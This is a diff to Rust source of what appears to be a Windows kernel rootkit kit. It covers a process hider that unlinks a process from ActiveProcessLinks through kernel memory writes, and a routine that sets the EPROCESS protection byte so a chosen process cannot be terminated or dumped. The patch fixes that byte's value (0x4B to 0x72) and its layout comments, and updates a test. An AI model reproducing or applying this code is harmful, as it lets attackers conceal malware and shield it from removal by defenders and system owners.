@@ -93,7 +93,9 @@ impl ProcessHider {
         let flink = krw.kread_u64(link_kva).map_err(KitError::from)? as usize;
         let blink = krw.kread_u64(link_kva + 8).map_err(KitError::from)? as usize;
         if flink < 0xFFFF_8000_0000_0000 || blink < 0xFFFF_8000_0000_0000 {
-            return Err(KitError::UnsupportedPosture("ActiveProcessLinks: non-canonical pointer"));
+            return Err(KitError::UnsupportedPosture(
+                "ActiveProcessLinks: non-canonical pointer",
+            ));
         }
         // blink->Flink = flink ; flink->Blink = blink
         krw.kwrite_u64(blink, flink as u64)
@@ -181,14 +183,15 @@ impl PplKit for PplStripper {
     }
 
     /// Promote `pid` to PPL (Protected | WinSystem). This is a one-way door:
-    /// once the process has Protection = 0x4B, it cannot be terminated or
+    /// once the process has Protection = 0x72, it cannot be terminated or
     /// dumped from user-mode — only kernel-mode can strip it back.
     ///
     /// # Protection byte layout (PS_PROTECTION)
     /// ```text
-    ///   bits [6:3] = Signer: 0x08 = WinSystem
-    ///   bits [2:0] = Type:   0x04 = Protected
-    ///   0x4B = (0x08 << 3) | 0x04 = Protected | WinSystem
+    ///   bits [7:4] = Signer: 7 = WinSystem
+    ///   bits [3]   = Audit: 0
+    ///   bits [2:0] = Type:   2 = Protected
+    ///   0x72 = (7 << 4) | 2 = Protected | WinSystem
     /// ```
     ///
     /// SignatureLevel = 0x3F = highest trust (Windows, WinTcb, WinSystem).
@@ -206,7 +209,7 @@ impl PplKit for PplStripper {
                 "non-canonical EPROCESS KVA — find_eprocess returned a corrupt address",
             ));
         }
-        // Protection = 0x4B: TYPE_PROTECTED (0x04) | SIGNER_WIN_SYSTEM (0x08 << 3)
+        // Protection = 0x72: TYPE_PROTECTED (2) | SIGNER_WIN_SYSTEM (7 << 4)
         krw.kwrite(
             eprocess_kva + self.offsets.protection,
             &[ps_protection::TYPE_PROTECTED
@@ -782,7 +785,7 @@ mod tests {
         };
         kit.make_immortal(&krw, 500).unwrap();
 
-        // Protection = 0x4B: TYPE_PROTECTED | SIGNER_WIN_SYSTEM << SIGNER_SHIFT
+        // Protection = 0x72: TYPE_PROTECTED | SIGNER_WIN_SYSTEM << SIGNER_SHIFT
         let expected_protection = ps_protection::TYPE_PROTECTED
             | (ps_protection::SIGNER_WIN_SYSTEM << ps_protection::SIGNER_SHIFT);
         assert_eq!(krw.get_byte(e1 + offsets.protection), expected_protection);
